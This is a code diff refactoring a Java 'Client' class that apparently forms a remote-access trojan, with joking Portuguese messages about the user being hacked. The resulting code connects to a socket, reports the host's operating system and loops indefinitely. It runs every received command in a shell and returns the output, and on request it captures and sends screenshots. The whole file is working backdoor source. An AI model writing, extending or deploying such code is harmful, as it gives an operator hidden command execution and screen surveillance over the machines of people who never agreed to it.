@@ -1,87 +1,60 @@
-import javax.imageio.ImageIO;
-import java.awt.*;
+import java.awt.AWTException;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.net.Socket;
 import java.util.Objects;
 import java.util.Scanner;
+import javax.imageio.ImageIO;
 
 public class Client {
     static Connection connection;
+    static OsCheck.OSType MY_OS;
 
     public static void main(String[] args) {
         try {
             System.out.println("Opa ta na hora de ser haskiado");
             connection = new Connection(new Socket("localhost", 27015));
 
-            OsCheck.OSType ostype = OsCheck.getOperatingSystemType();
-            switch (ostype) {
-                case Windows:
-                    windowsHandler();
-                    break;
-                case MacOS:
-                    unixHandler();
-                    break;
-                case Linux:
-                    unixHandler();
-                    break;
-                case Other:
-                    unixHandler();
-                    break;
-            }
+            MY_OS = OsCheck.getOperatingSystemType();
 
-        } catch (Exception e) {
+            Message osMessage = new Message("print", "User is using " + MY_OS.name());
+            connection.sendMessage(osMessage);
+
+            while(true) {
+                String command = connection.readMessage().getCommand();
+
+                switch(command) {
+                    case "screen":
+                        sendScreenshot();
+                        break;
+                    default:
+                        runTerminalCommand(MY_OS, command);
+                }
+            }
+        } catch(Exception e) {
             e.printStackTrace();
         }
     }
 
-    static void windowsHandler() throws Exception {
-        System.out.println("Hm safadinho ta no uindous do biu gayts neh kk");
-        Runtime.getRuntime().exec("cmd /c cd C:\\");
-        while (true) {
-            String command = connection.readMessage().getCommand();
-
-            switch(command) {
-                case "screen":
-                    sendScreenshot();
-                    break;
-                default:
-                    runTerminalCommand("cmd /c" + command);
-            }
+    private static void runTerminalCommand(OsCheck.OSType os, String command) throws IOException {
+        if(os.equals(OsCheck.OSType.Windows)) {
+            Runtime.getRuntime().exec("cmd /c cd C:\\");
+            command = "cmd /c" + command;
         }
-    }
 
-    static void unixHandler() throws Exception {
-        System.out.println("Hm safadinho ta usando uns uniks heim kk q developer vc");
-        while (true) {
-            String command = connection.readMessage().getCommand();
-
-            switch(command) {
-                case "screen":
-                    sendScreenshot();
-                    break;
-                default:
-                    runTerminalCommand(command);
-            }
-
-            if (Objects.equals(command, "screen")) { // neguin pediu screenshot
-                sendScreenshot();
-            } else {
-
-            }
-        }
-    }
-
-    private static void runTerminalCommand(String command) throws IOException {
         Process proc = Runtime.getRuntime().exec(command);
         Scanner respostaDoComando = new Scanner(proc.getInputStream());
 
         StringBuilder response = new StringBuilder();
-        while (respostaDoComando.hasNext()) {
+        while(respostaDoComando.hasNext()) {
             response.append(respostaDoComando.nextLine() + "\n");
+            response.append("---------------------------------------");
         }
-        connection.sendMessage(new Message(response.toString()));
+        connection.sendMessage(new Message("print", response.toString()));
     }
 
     private static void sendScreenshot() throws AWTException, IOException {
@@ -89,7 +62,7 @@ public class Client {
         BufferedImage screenshot = new Robot().createScreenCapture(screenRect);
 
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ImageIO.write( screenshot, "jpg", baos );
+        ImageIO.write(screenshot, "jpg", baos);
         baos.flush();
         byte[] imageBytes = baos.toByteArray();
         baos.close();
